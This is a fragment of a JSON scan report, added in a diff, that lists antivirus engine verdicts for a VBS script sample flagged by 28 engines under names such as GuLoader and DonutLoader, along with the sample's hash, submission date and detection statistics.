+        "NANO-Antivirus": {
+          "method": "blacklist",
+          "engine_name": "NANO-Antivirus",
+          "engine_version": "1.0.170.26895",
+          "engine_update": "20261109",
+          "category": "undetected",
+          "result": null
+        },
+        "SUPERAntiSpyware": {
+          "method": "blacklist",
+          "engine_name": "SUPERAntiSpyware",
+          "engine_version": "5.6.0.1032",
+          "engine_update": "20261107",
+          "category": "undetected",
+          "result": null
+        },
+        "Rising": {
+          "method": "blacklist",
+          "engine_name": "Rising",
+          "engine_version": "25.0.0.28",
+          "engine_update": "20261109",
+          "category": "undetected",
+          "result": null
+        },
+        "Sophos": {
+          "method": "blacklist",
+          "engine_name": "Sophos",
+          "engine_version": "3.7.2.1",
+          "engine_update": "20261109",
+          "category": "undetected",
+          "result": null
+        },
+        "F-Secure": {
+          "method": "blacklist",
+          "engine_name": "F-Secure",
+          "engine_version": "18.10.1547.307",
+          "engine_update": "20261109",
+          "category": "malicious",
+          "result": "Trojan.TR/SNH"
+        },
+        "DrWeb": {
+          "method": "blacklist",
+          "engine_name": "DrWeb",
+          "engine_version": "7.0.76.8280",
+          "engine_update": "20261109",
+          "category": "undetected",
+          "result": null
+        },
+        "VIPRE": {
+          "method": "blacklist",
+          "engine_name": "VIPRE",
+          "engine_version": "6.0.0.35",
+          "engine_update": "20261109",
+          "category": "malicious",
+          "result": "GT:VB.SmvCncPw.1.6240C73B"
+        },
+        "TrendMicro": {
+          "method": "blacklist",
+          "engine_name": "TrendMicro",
+          "engine_version": "24.550.0.1002",
+          "engine_update": "20261109",
+          "category": "malicious",
+          "result": "Trojan.VBS.DONUTLOADER.YXGKIZ"
+        },
+        "McAfeeD": {
+          "method": "blacklist",
+          "engine_name": "McAfeeD",
+          "engine_version": "1.2.0.16534",
+          "engine_update": "20261109",
+          "category": "malicious",
+          "result": "ti!82A2D71036DD"
+        },
+        "CTX": {
+          "method": "blacklist",
+          "engine_name": "CTX",
+          "engine_version": "2026.10.27.1",
+          "engine_update": "20261109",
+          "category": "malicious",
+          "result": "script.unknown.smvcncpw"
+        },
+        "Emsisoft": {
+          "method": "blacklist",
+          "engine_name": "Emsisoft",
+          "engine_version": "2024.8.0.61147",
+          "engine_update": "20261109",
+          "category": "malicious",
+          "result": "GT:VB.SmvCncPw.1.6240C73B (B)"
+        },
+        "Ikarus": {
+          "method": "blacklist",
+          "engine_name": "Ikarus",
+          "engine_version": "6.5.4.0",
+          "engine_update": "20261109",
+          "category": "malicious",
+          "result": "Trojan-Dropper.VBS.Agent"
+        },
+        "Jiangmin": {
+          "method": "blacklist",
+          "engine_name": "Jiangmin",
+          "engine_version": "16.0.100",
+          "engine_update": "20261108",
+          "category": "undetected",
+          "result": null
+        },
+        "Varist": {
+          "method": "blacklist",
+          "engine_name": "Varist",
+          "engine_version": "6.6.1.3",
+          "engine_update": "20261109",
+          "category": "malicious",
+          "result": "VBS/Agent.CGV1!Eldorado"
+        },
+        "Avira": {
+          "method": "blacklist",
+          "engine_name": "Avira",
+          "engine_version": "8.3.3.24",
+          "engine_update": "20261109",
+          "category": "malicious",
+          "result": "TR/SNH"
+        },
+        "Antiy-AVL": {
+          "method": "blacklist",
+          "engine_name": "Antiy-AVL",
+          "engine_version": "3.0",
+          "engine_update": "20261109",
+          "category": "undetected",
+          "result": null
+        },
+        "Kingsoft": {
+          "method": "blacklist",
+          "engine_name": "Kingsoft",
+          "engine_version": "None",
+          "engine_update": "20261109",
+          "category": "undetected",
+          "result": null
+        },
+        "Gridinsoft": {
+          "method": "blacklist",
+          "engine_name": "Gridinsoft",
+          "engine_version": "1.0.262.174",
+          "engine_update": "20261109",
+          "category": "undetected",
+          "result": null
+        },
+        "Xcitium": {
+          "method": "blacklist",
+          "engine_name": "Xcitium",
+          "engine_version": "39100",
+          "engine_update": "20261109",
+          "category": "undetected",
+          "result": null
+        },
+        "Microsoft": {
+          "method": "blacklist",
+          "engine_name": "Microsoft",
+          "engine_version": "1.26100",
+          "engine_update": "20261109",
+          "category": "malicious",
+          "result": "Trojan:Win32/Malgent"
+        },
+        "ViRobot": {
+          "method": "blacklist",
+          "engine_name": "ViRobot",
+          "engine_version": "2026-11-09.03",
+          "engine_update": "20261109",
+          "category": "undetected",
+          "result": null
+        },
+        "ZoneAlarm": {
+          "method": "blacklist",
+          "engine_name": "ZoneAlarm",
+          "engine_version": "6.28-119762367",
+          "engine_update": "20261109",
+          "category": "undetected",
+          "result": null
+        },
+        "GData": {
+          "method": "blacklist",
+          "engine_name": "GData",
+          "engine_version": "GD:27.46657AVA:64.32204",
+          "engine_update": "20261109",
+          "category": "malicious",
+          "result": "GT:VB.SmvCncPw.1.6240C73B"
+        },
+        "Google": {
+          "method": "blacklist",
+          "engine_name": "Google",
+          "engine_version": "1794243671",
+          "engine_update": "20261109",
+          "category": "malicious",
+          "result": "Detected"
+        },
+        "AhnLab-V3": {
+          "method": "blacklist",
+          "engine_name": "AhnLab-V3",
+          "engine_version": "3.30.3.10716",
+          "engine_update": "20261109",
+          "category": "undetected",
+          "result": null
+        },
+        "Acronis": {
+          "method": "blacklist",
+          "engine_name": "Acronis",
+          "engine_version": "1.2.0.121",
+          "engine_update": "20240328",
+          "category": "undetected",
+          "result": null
+        },
+        "VBA32": {
+          "method": "blacklist",
+          "engine_name": "VBA32",
+          "engine_version": "5.7.1",
+          "engine_update": "20261109",
+          "category": "undetected",
+          "result": null
+        },
+        "TACHYON": {
+          "method": "blacklist",
+          "engine_name": "TACHYON",
+          "engine_version": "2026-11-09.02",
+          "engine_update": "20261109",
+          "category": "undetected",
+          "result": null
+        },
+        "Zoner": {
+          "method": "blacklist",
+          "engine_name": "Zoner",
+          "engine_version": "2.2.2.0",
+          "engine_update": "20261109",
+          "category": "undetected",
+          "result": null
+        },
+        "Tencent": {
+          "method": "blacklist",
+          "engine_name": "Tencent",
+          "engine_version": "1.0.0.1",
+          "engine_update": "20261109",
+          "category": "malicious",
+          "result": "Win32.Trojan.Snh.Gajl"
+        },
+        "Yandex": {
+          "method": "blacklist",
+          "engine_name": "Yandex",
+          "engine_version": "5.5.2.24",
+          "engine_update": "20261109",
+          "category": "undetected",
+          "result": null
+        },
+        "TrellixENS": {
+          "method": "blacklist",
+          "engine_name": "TrellixENS",
+          "engine_version": "6.0.6.653",
+          "engine_update": "20261109",
+          "category": "undetected",
+          "result": null
+        },
+        "huorong": {
+          "method": "blacklist",
+          "engine_name": "huorong",
+          "engine_version": "c1c2a8f:c1c2a8f:0b37565:0b37565",
+          "engine_update": "20261109",
+          "category": "malicious",
+          "result": "HEUR:Trojan/VBS.GuLoader.f"
+        },
+        "MaxSecure": {
+          "method": "blacklist",
+          "engine_name": "MaxSecure",
+          "engine_version": "4.0.3.0",
+          "engine_update": "20261109",
+          "category": "undetected",
+          "result": null
+        },
+        "Fortinet": {
+          "method": "blacklist",
+          "engine_name": "Fortinet",
+          "engine_version": "7.0.48.0",
+          "engine_update": "20261109",
+          "category": "undetected",
+          "result": null
+        },
+        "AVG": {
+          "method": "blacklist",
+          "engine_name": "AVG",
+          "engine_version": "23.9.8494.0",
+          "engine_update": "20261109",
+          "category": "malicious",
+          "result": "Script:SNH-gen [Trj]"
+        },
+        "Panda": {
+          "method": "blacklist",
+          "engine_name": "Panda",
+          "engine_version": "4.6.4.2",
+          "engine_update": "20261109",
+          "category": "undetected",
+          "result": null
+        },
+        "alibabacloud": {
+          "method": "blacklist",
+          "engine_name": "alibabacloud",
+          "engine_version": "2.2.0",
+          "engine_update": "20250321",
+          "category": "malicious",
+          "result": "Trojan[dropper]:Win/Malgent.Gen"
+        },
+        "Zillya": {
+          "method": "blacklist",
+          "engine_name": "Zillya",
+          "engine_version": "2.0.0.5726",
+          "engine_update": "20261109",
+          "category": "failure",
+          "result": null
+        },
+        "Avast-Mobile": {
+          "method": "blacklist",
+          "engine_name": "Avast-Mobile",
+          "engine_version": "261109-00",
+          "engine_update": "20261109",
+          "category": "type-unsupported",
+          "result": null
+        },
+        "SymantecMobileInsight": {
+          "method": "blacklist",
+          "engine_name": "SymantecMobileInsight",
+          "engine_version": "2.0",
+          "engine_update": "20260123",
+          "category": "type-unsupported",
+          "result": null
+        },
+        "BitDefenderFalx": {
+          "method": "blacklist",
+          "engine_name": "BitDefenderFalx",
+          "engine_version": "2.0.936",
+          "engine_update": "20261022",
+          "category": "type-unsupported",
+          "result": null
+        },
+        "DeepInstinct": {
+          "method": "blacklist",
+          "engine_name": "DeepInstinct",
+          "engine_version": "5.0.0.8",
+          "engine_update": "20260614",
+          "category": "type-unsupported",
+          "result": null
+        },
+        "Elastic": {
+          "method": "blacklist",
+          "engine_name": "Elastic",
+          "engine_version": "4.0.297",
+          "engine_update": "20261109",
+          "category": "type-unsupported",
+          "result": null
+        },
+        "Webroot": {
+          "method": "blacklist",
+          "engine_name": "Webroot",
+          "engine_version": "1.9.0.8",
+          "engine_update": "20250227",
+          "category": "type-unsupported",
+          "result": null
+        },
+        "APEX": {
+          "method": "blacklist",
+          "engine_name": "APEX",
+          "engine_version": "6.839",
+          "engine_update": "20261107",
+          "category": "type-unsupported",
+          "result": null
+        },
+        "Paloalto": {
+          "method": "blacklist",
+          "engine_name": "Paloalto",
+          "engine_version": "0.9.0.1003",
+          "engine_update": "20261109",
+          "category": "type-unsupported",
+          "result": null
+        },
+        "Alibaba": {
+          "method": "blacklist",
+          "engine_name": "Alibaba",
+          "engine_version": "0.3.0.5",
+          "engine_update": "20190527",
+          "category": "type-unsupported",
+          "result": null
+        },
+        "Trapmine": {
+          "method": "blacklist",
+          "engine_name": "Trapmine",
+          "engine_version": "4.0.17.0",
+          "engine_update": "20261026",
+          "category": "type-unsupported",
+          "result": null
+        },
+        "Cylance": {
+          "method": "blacklist",
+          "engine_name": "Cylance",
+          "engine_version": "3.0.0.0",
+          "engine_update": "20261103",
+          "category": "type-unsupported",
+          "result": null
+        },
+        "SentinelOne": {
+          "method": "blacklist",
+          "engine_name": "SentinelOne",
+          "engine_version": "7.8.0.2",
+          "engine_update": "20260924",
+          "category": "type-unsupported",
+          "result": null
+        },
+        "tehtris": {
+          "method": "blacklist",
+          "engine_name": "tehtris",
+          "engine_version": "v0.1.4",
+          "engine_update": "20261109",
+          "category": "type-unsupported",
+          "result": null
+        },
+        "Trustlook": {
+          "method": "blacklist",
+          "engine_name": "Trustlook",
+          "engine_version": "1.0",
+          "engine_update": "20261109",
+          "category": "type-unsupported",
+          "result": null
+        }
+      },
+      "first_submission_date": 1794232976,
+      "vhash": "738dab0efb42b27a1a127fd6b78ea547",
+      "sigma_analysis_summary": {
+        "Sigma Integrated Rule Set (GitHub)": {
+          "critical": 0,
+          "high": 0,
+          "medium": 5,
+          "low": 1
+        }
+      },
+      "type_tags": [
+        "source",
+        "vba",
+        "vbs"
+      ],
+      "last_analysis_stats": {
+        "malicious": 28,
+        "suspicious": 0,
+        "undetected": 32,
+        "harmless": 0,
+        "timeout": 0,
+        "confirmed-timeout": 0,
+        "failure": 1,
+        "type-unsupported": 14
+      }
+    }
+  }
+}
